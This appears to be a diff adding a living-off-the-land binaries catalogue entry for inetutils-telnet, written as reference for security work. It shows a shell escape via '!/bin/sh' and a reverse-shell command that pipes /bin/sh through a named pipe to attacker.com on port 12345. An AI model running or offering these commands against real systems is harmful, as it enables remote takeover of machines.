@@ -1,0 +1,15 @@
+---
+comment: inetutils-telnet can be abused to execute commands or create reverse shells.
+functions:
+  shell:
+    - comment: Spawns a shell through the telnet command escape feature.
+      code: |
+        inetutils-telnet
+        !/bin/sh
+  reverse-shell:
+    - comment: Creates a reverse shell using inetutils-telnet and a named pipe.
+      code: |
+        mkfifo /path/to/temp-socket
+        inetutils-telnet attacker.com 12345 </path/to/temp-socket | /bin/sh >/path/to/temp-socket
+      tty: false
+      listener: TCP
